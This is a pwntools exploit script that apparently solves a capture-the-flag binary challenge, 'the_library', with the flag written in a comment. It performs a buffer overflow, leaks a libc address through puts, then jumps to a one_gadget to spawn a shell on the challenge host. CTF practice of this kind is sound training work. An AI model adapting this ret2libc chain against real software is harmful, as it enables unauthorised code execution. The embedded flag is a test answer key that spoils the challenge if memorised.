from pwn import *

# flag{54b7742240a85bf62aa6fcf16c7e66a4}

elf = ELF('the_library')
context.update(os='linux', arch='amd64', binary=elf)
pop_rdi = 0x401493
one_gadgets = [0xe6c7e, 0xe6c81, 0xe6c84]
offset = 552

host = 'challenge.ctf.games'
port = 31125

if args.LOCAL:
	p = elf.process()
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote(host, port)
	libc = ELF('libc-2.31.so')

func = '__libc_start_main'

p.recvuntil(b'> ')
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got[func])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendline(payload)
p.recvline()
leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
log.info(f'Leaked {func}: {hex(leak)}')
libc.address = leak - libc.symbols[func]
one_gadget = libc.address + one_gadgets[1]

p.recvuntil(b'> ')
payload = b'A' * offset
payload += p64(one_gadget)
p.sendline(payload)

p.interactive()

